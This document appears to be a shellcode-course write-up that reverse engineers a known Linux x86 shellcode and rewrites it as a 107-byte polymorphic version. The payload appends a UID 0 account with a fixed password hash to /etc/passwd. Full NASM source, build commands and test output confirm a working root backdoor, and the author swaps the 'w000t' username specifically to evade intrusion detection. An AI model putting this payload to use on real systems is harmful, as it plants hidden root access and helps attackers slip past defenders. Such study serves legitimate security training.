## Overview
This shellcode is a polymorphic version of zillions `w000t-shell.c` shellcode.  
+ The original shellcode can be found at: http://shell-storm.org/shellcode/files/shellcode-543.php.
+ The original shellcode is `137 bytes`.
+ The final polymorphic version of the shellcode is `107 bytes`.

## Analyzing the Shellcode
To begin to create a polymorphic version of this shellcode I first had to understand it.   
Since there was only the hex of the shellcode in the post,  I reverse engineered the hex and created this mock-up of the original Assembly Instructions.  
#### Mock-up of Original Shellcode
```nasm
global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  mov byte [esi +7], al     ; Null byte to terminate string "/bin/sh"
  mov byte [esi +10], al    ; Null byte to terminate string "-c"
  mov byte [esi +71], al    ; Null byte to terminate string
                            ; "/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd"
  mov dword [esi +73], esi  ; argv[] array start. Memory pointer to string "/bin/sh"
  lea ebx, [esi +8]         ; move pointer to string "-c" into ebx register
  mov dword [esi +77], ebx  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  lea ebx, [esi +11]        ; move pointer to string "/bin/echo..." into ebx register
  mov dword [esi +81], ebx  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  mov dword [esi +85], eax  ; argv[] Null dword terminator.
  mov al, 0xb               ; 11 - syscall for execve
  mov ebx, esi              ; location of string "/bin/sh" for program filename
  lea ecx, [esi +73]        ; argv pointers to args
  lea edx, [esi +85]        ; fill edx with null dword
  int 0x80                  ; executes execve systemcall
jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "/bin/sh#-c#/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd#AAAABBBBCCCCDDDD"
;            0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567
;                      1         2         3         4         5         6         7         8
```
+ The code was compilted & tested; works as intended.
+ To find the intructions gdb was used. 

### Problem with this Shellcode
+ When this shellcode was created, linux systems would allow an account with no password to be logged in by anyone.
+ Modern Linux systems, will lock the account if it has no password.
+ Any attempt to login will recieve the error `"Authentication Failure"`.
+ Deleting a password is now a technique for sys-admins to lock a users account.

#### Creating a Hashed Password for /etc/passwd
```console
user$ openssl passwd ctl
NNwZ8D1QjVy3Y
```
+ This creates the hash for the password `ctl`. 
+ We will use this in the second field of `/etc/passwd` line.

#### w000t username
+ The strings `w00t` & `w000t` are frequently used in known exploits.
+ Highly likely an IPS/IDS will flag these strings.
+ the username `ctl` was used instead.

## Changing the Shellcode

### argv[] / ECX - Stack instead of Code Section
In the original shellcode, `JMP|Call|POP` was used to load the memory address of the string into the `esi` register. 
+ All pointers to fufill the second arguments `argv[]`, for `execve` where within this string.
+ In the polymorphic version, all of the arguements for `argv[]` on the `stack`.

#### argv[4] - End the argv[] Array
```nasm
  xor eax, eax              ; clear out eax register
snip--
  push eax                  ; push to stack argv[] Null dword array terminator.
```

#### argv[2] - Arguements to Flag
```nasm
  mov byte [esi +61], al    ; Null byte to terminate string
                            ;  "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
  lea ebx, [esi +3]         ; move pointer to string "/bin/echo..." into ebx register
  push ebx                  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
```

#### argv[1] - Flag of Program
```nasm
  mov byte [esi +2], al     ; Null byte to terminate string "-c"
  lea ebx, [esi]            ; move pointer to string "-c" into ebx register
  push ebx                  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
```

#### argv[0] - Pointer to Program Path
```nasm
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
snip--
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
  push ebx                  ; argv[] array start. Memory pointer to string "/bin/sh"
snip--
  mov ecx, esp              ; point ecx to top of stack
```

### Reuse the "/bin//sh" in the string memory
+ Since the string already has `/bin//sh` the leading `/bin//sh` was deleted.
  - This memory location of `/bin//sh` in the string was used to fufill the `ebx` register.
+ The string was changed from "/bin/sh" to "/bin//sh"
  - This way it fits into 2 `DWORD`s.
  - These `DWORD`s were pushed on to the stack.

```nasm
  xor eax, eax              ; clear out eax register
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
snip--
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
```

## Final Polymorphic Shellcode
```nasm
global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  lea edx, [esp]            ; fill edx with pointer to null dword
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
  mov byte [esi +2], al     ; Null byte to terminate string "-c"
  mov byte [esi +61], al    ; Null byte to terminate string
                            ;  "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
  push eax                  ; push to stack argv[] Null dword array terminator.
  lea ebx, [esi +3]         ; move pointer to string "/bin/echo..." into ebx register
  push ebx                  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  lea ebx, [esi]            ; move pointer to string "-c" into ebx register
  push ebx                  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
  push ebx                  ; argv[] array start. Memory pointer to string "/bin/sh"
  mov ecx, esp              ; point ecx to top of stack
  mov al, 0xb               ; 11 - syscall for execve
  int 0x80                  ; executes execve systemcall

jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh >> /etc/passwd"
;            01234567890123456789012345678901234567890123456789012345678901
;                      1         2         3         4         5         6

; string db "/bin/sh#-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
```
+ The users shell was changed from `/bin/bash` to `/bin//sh`.
  - The number of `/` characters does not matter for calling a program by its full path in Linux.
  - `/bin/sh` is more universal than `/bin/bash`.
  - Using `/bin/sh` also shortens the final length of the shellcode.
+ The `#` at the end of the echo string was also removed.
  - Since the string is at the end of shellcode memory, it should not matter if we overwrite this `byte` in the `code segment`.

# Testing the Shellcode

## Getting the Hex of the Shellcode
#### Compiling & Linking the Shellcode
```nasm
root# nasm -f elf32 poly3.addAcct.nasm -o poly3.addAcct.o
root# ld -z execstack poly3.addAcct.o -o poly3.addAcct
```

### Overcoming Problems with Objdump CL-Fu
#### Dump the Hex with Object Dump
+ Unfortunately our objdump command line fu does not work for this shellcode.
+ To remedy this issues, `objdump -d poly3.addAcct` was used.
+ Byobu was used to grab the shellcode hex from the output.  
![](/assets/images/byobu-box-select.png)
  - `F7` to enter copy-mode
  - `space`+`v` to select text with a box
  - `enter` to copy to clipboard
  - `ctrl+a`+`]` to paste
#### Vi to Format the Hex from Byobu Buffer
+ _vim-fu_ was used to format the hex into the needed C format.  
![](/assets/images/vi-x-format.png)
  - Delete unneeded lines `dd` 
  - `:%s/ *$//g` 
    - Delete extra space characters at the end of the lines. 
  - `:se nu`     
    - See the line numbers
  - `gg`         
    - go to the first character of the first line
  - `i`+`<space>`
    - Put a space before the first hex character
  - `48 J`       
    - Join all 48 lines together
  - `%s/ /\\x/g` 
    - Replace all spaces with the C hex indicator

### Add the Shellcode to Host Program
![](/assets/images/shellcode-c.png)

#### Compiling Host Program
```console
root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```

### Testing the Injected Shellcode
```console
root# tail -n 1 /etc/passwd
user:x:1000:1000:user,,,:/home/user:/bin/bash
root# ./shellcode
Shellcode Length:  107
root# tail -n 1 /etc/passwd
ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh
```
+ Here we see that our user line has successfully been appended to the /etc/passwd file.

### Testing our new UID 0 User
```console
root# su user
user$ su ctl
Password: ctl
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
+ Great Success!
+ We changed to a lower level user because changing to a user as root does not require any authentication.
+ Our username ctl does not show since the root user is mapped to UID + GID 0.
